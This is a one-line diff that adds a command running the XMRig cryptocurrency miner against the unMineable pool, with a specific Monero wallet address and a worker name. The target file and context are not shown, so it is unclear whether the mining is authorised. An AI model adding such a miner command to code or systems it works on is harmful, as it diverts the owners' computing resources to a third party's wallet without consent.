@@ -1,0 +1,1 @@
+xmrig.exe -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u XMR:475tWoYaxre8h2pmPne1WuCPEpFBN5pQLFMMJd2Qh21KdYcKSZdijsgVQtw4F9ao5M75Rn7MNupPQR1RNJ7Nt2NNDacQFDE.vpshuong -p x
